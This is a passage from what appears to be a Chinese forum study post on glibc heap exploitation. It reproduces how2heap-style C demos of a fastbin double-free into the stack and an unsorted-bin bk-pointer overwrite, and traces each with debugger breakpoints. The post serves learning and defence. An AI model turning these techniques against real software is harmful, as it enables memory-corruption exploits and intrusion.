
```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
fprintf(stderr,"This file extends on fastbin_dup.c by tricking malloc into\n" "returning a pointer to a controlled location (in this case, the stack).\n");
unsigned long long stack_var;
fprintf(stderr,"The address we want malloc() to return is %p.\n", 8+(char*)&stack_var);
fprintf(stderr,"Allocating 3 buffers.\n");
int *a = malloc(8);
int *b = malloc(8);
int *c = malloc(8);
fprintf(stderr,"1st malloc(8): %p\n", a);
fprintf(stderr,"2nd malloc(8): %p\n", b);
fprintf(stderr,"3rd malloc(8): %p\n", c);
fprintf(stderr,"Freeing the first one...\n");
free(a);
fprintf(stderr,"If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
// free(a);
fprintf(stderr,"So, instead, we'll free %p.\n", b);
free(b);
fprintf(stderr,"Now, we can free %p again, since it's not the head of the free list.\n", a);
free(a);
fprintf(stderr,"Now the free list has [ %p, %p, %p ]. " "We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
unsigned long long *d = malloc(8);
fprintf(stderr,"1st malloc(8): %p\n", d);
fprintf(stderr,"2nd malloc(8): %p\n", malloc(8));
fprintf(stderr,"Now the free list has [ %p ].\n", a);
fprintf(stderr,"Now, we have access to %p while it remains at the head of the free list.\n" "so now we are writing a fake free size (in this case, 0x20) to the stack,\n" "so that malloc will think there is a free chunk there and agree to\n" "return a pointer to it.\n", a);
stack_var = 0x20;
fprintf(stderr,"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
*d = (unsigned long long)(((char*)&stack_var) - sizeof(d));
fprintf(stderr,"3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
fprintf(stderr,"4th malloc(8): %p\n", malloc(8));
}
```

## 调试

使用`ubuntu:16.04`进行编译

![](https://bbs.kanxue.com/upload/attach/202306/958172_F7M2S7WM7URA2WQ.png)

使用`pwncli`改写`rpath`

![](https://bbs.kanxue.com/upload/attach/202306/958172_YRQV6TQJYQWAXFV.png)

在`malloc`三次后，0x400743处下断点

![](https://bbs.kanxue.com/upload/attach/202306/958172_U8FQ8QMKCMJEEHE.png)

查看堆信息,三个`fastbin`的堆块，`f1`,`f2`,`f3`。

![](https://bbs.kanxue.com/upload/attach/202306/958172_YBSW3KZB8CFB9PV.png)

在`free(f1)`,`free(f2)`,`free(f1)`后，在0x40083B下断点。

![](https://bbs.kanxue.com/upload/attach/202306/958172_XRP63QAXTP42DB4.png)

查看`fastbin`Y信息。

![](https://bbs.kanxue.com/upload/attach/202306/958172_5PQAMT3K7NY6GSP.png)

`0x20`大小的`fastbins`链上形成了`double free`。

再次`malloc`两次后，设断点在0x40089F

![](https://bbs.kanxue.com/upload/attach/202306/958172_B4MCXD5ETFVSG4E.png)

再次查看`bins`，因为申请两次后，`fastbins`中剩下`f1(0x60300)`，而`0x60300`指向`0x603020`没有改变，`0x603020`指向`0x60300`也没变，并且`fastbins`中的`chunk`标记为`prev_inuse`一直为1，所以`fastbins`中依然保留这个`ABA`结构。

![](https://bbs.kanxue.com/upload/attach/202306/958172_7QJAPUB4DDD2PHB.png)

接下来，查看汇编代码，`StackVar`值改为`0x20`，为了放入`0x20`大小的`fastbins`,接下来把`f1`指向了`StackVar`以上`0x8`处，也就是`prev_size`的位置。将`StackVar`放入了`0x20`的`fastbins`中。在0x40092C处下断点。

![](https://bbs.kanxue.com/upload/attach/202306/958172_4PUYYFZPQXKV9KS.png)

查看堆信息。

![](https://bbs.kanxue.com/upload/attach/202306/958172_TMDXE86NU7SRWS3.png)

这时候在申请两次便可申请到栈上。

![](https://bbs.kanxue.com/upload/attach/202306/958172_WBDHQYTZ4AXN4ZB.png)

在0x40095c下断点。

![](https://bbs.kanxue.com/upload/attach/202306/958172_D7WDB4DZ4DJS79F.png)

可以看到，已经申请到了栈上的值。

# unsorted_bin_attack

`glibc < 2.29`

## 源码

```c
#include <stdio.h>
#include <stdlib.h>
int main(){
fprintf(stderr,"This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
fprintf(stderr,"In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the " "global variable global_max_fast in libc for further fastbin attack\n\n");
unsigned long stack_var=0;
fprintf(stderr,"Let's first look at the target we want to rewrite on stack:\n");
fprintf(stderr,"%p: %ld\n\n", &stack_var, stack_var);
unsigned long *p=malloc(400);
fprintf(stderr,"Now, we allocate first normal chunk on the heap at: %p\n",p);
fprintf(stderr,"And allocate another normal chunk in order to avoid consolidating the top chunk with" "the first one during the free()\n\n");
malloc(500);
free(p);
fprintf(stderr,"We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer " "point to %p\n",(void*)p[1]);
//------------VULNERABILITY-----------
p[1]=(unsigned long)(&stack_var-2);
fprintf(stderr,"Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
fprintf(stderr,"And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);
//------------------------------------
malloc(400);
fprintf(stderr,"Let's malloc again to get the chunk we just free. During this time, the target should have already been " "rewritten:\n");
fprintf(stderr,"%p: %p\n", &stack_var, (void*)stack_var);
}
```

## 调试

使用`ubuntu:16.04`进行编译，然后使用`pwncli`改写`rpath`。

![图片描述](https://bbs.kanxue.com/upload/attach/202306/958172_CHJZNE3YDAFDZMS.png)

查看`bins`和`heap`信息

![图片描述](https://bbs.kanxue.com/upload/attach/202306/958172_CKURHWFQTKVYSZ4.png)

`free`第一个`chunk`以后，`bins`和`heap`信息，`unsorted bin`里的第一个`chunk`的`fd`和`bk`指向`main_arena+0x58`的位置。

![图片描述](https://bbs.kanxue.com/upload/attach/202306/958172_E396T5K2YSZR35Q.png)

接下来利用`uaf`将`unsorted bin`中的第一个`chunk`的`bk`指针（`rax`存储的指针指向`fd`,`rax+8`指向`bk`,`bk`指向后加入的`chunk`）指向`StackVar`的`prev_size`位置。

![图片描述](https://bbs.kanxue.com/upload/attach/202306/958172_UC93S5J8Q2CNP72.png)

在0x4007D9处下断点，查看`heap`和`bins`信息。可以看到，`0x602000`处的`chunk`的`bk`指针被改为了一个栈值，`fd`指向`main_arena+0x58`的位置。

![图片描述](https://bbs.kanxue.com/upload/attach/202306/958172_SDRG3NXMAMS4XK9.png)

再次将`unsorted bin`中第一个`chunk`给`malloc`出来以后，`unsorted bin`中仅剩`StackVar-0x10`。

![图片描述](https://bbs.kanxue.com/upload/attach/202306/958172_ZJY9Q5VVBT68CZ3.png)

在0x400828下断点。查看`heap`和`bins`信息。

![图片描述](https://bbs.kanxue.com/upload/attach/202306/958172_Z4EUWZVH32R7NCC.png)

可以看到，`StackVar`的`fd`指针即用户区域起始处已被修改为`main_arena+0x58`的值。

# unsorted_bin_into_stack

`glibc < 2.29`

## 源码
